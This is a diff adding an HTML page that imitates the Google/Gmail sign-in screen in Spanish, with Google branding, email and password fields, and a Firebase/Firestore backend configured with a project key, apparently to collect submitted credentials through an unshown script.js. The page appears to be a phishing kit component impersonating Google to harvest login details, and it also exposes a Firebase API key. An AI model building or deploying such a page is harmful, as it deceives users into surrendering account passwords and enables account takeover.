@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+      integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
+      crossorigin="anonymous" />
+    <link
+      rel="shortcut icon"
+      href="https://cdn.icon-icons.com/icons2/2631/PNG/512/gmail_new_logo_icon_159149.png"
+      type="image/x-icon"
+    />
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css" />
+    <title>Gmail</title>
+  </head>
+  <body>
+    <section class="content-wrapper">
+      <div class="card">
+        <div class="card-header">
+          <img
+            src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/1280px-Google_2015_logo.svg.png"
+            alt="google"
+            width="80px"
+          />
+          <h2>Acceder</h2>
+          <p class="go-gmail">Ir a Gmail</p>
+        </div>
+        <form id="form-sign">
+          <input type="email" name="correo" placeholder="Correo electrónico o teléfono" />
+          <input type="password" name="password" placeholder="Contraseña" />
+          <a class="forget" href="#">¿Olvidaste el correo electrónico?</a>
+          <p class="guest-info">
+            ¿Esta no es tu computadora? Usa el modo de invitado para navegar de
+            forma privada. <a href="#">Más información</a>
+          </p>
+          <div class="buttons-wrapper">
+            <button class="btn secondary" type="button">Crear cuenta</button>
+            <button class="btn primary" type="submit">Acceder</button>
+          </div>
+        </form>
+      </div>
+      <div class="footer">
+        <a href="">Español(Latinoamérica) <i class="fas fa-caret-down"></i> </a>
+        <span class="other_options">
+          <a href="#">Ayuda</a>
+          <a href="#">Privacidad</a>
+          <a href="#">Condiciones</a>
+        </span>
+      </div>
+    </section>
+    <!-- The core Firebase JS SDK is always required and must be listed first -->
+    <script src="https://www.gstatic.com/firebasejs/8.6.2/firebase-app.js"></script>
+    
+    <!-- TODO: Add SDKs for Firebase products that you want to use
+         https://firebase.google.com/docs/web/setup#available-libraries -->
+    <script src="https://www.gstatic.com/firebasejs/8.6.2/firebase-analytics.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.2/firebase-firestore.js"></script>
+    <script>
+      // Your web app's Firebase configuration
+      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+      var firebaseConfig = {
+        apiKey: "AIzaSyDJidWbyMwtb29bIF0u7NyITLOmwQm8q_k",
+        authDomain: "sign-gin.firebaseapp.com",
+        projectId: "sign-gin",
+        storageBucket: "sign-gin.appspot.com",
+        messagingSenderId: "11981564671",
+        appId: "1:11981564671:web:0290695c7b71059a903aca",
+        measurementId: "G-H9SL5V7107"
+      };
+      // Initialize Firebase
+      firebase.initializeApp(firebaseConfig);
+      firebase.analytics();
+    </script>
+    <script src="./script.js"></script>
+  </body>
+</html>
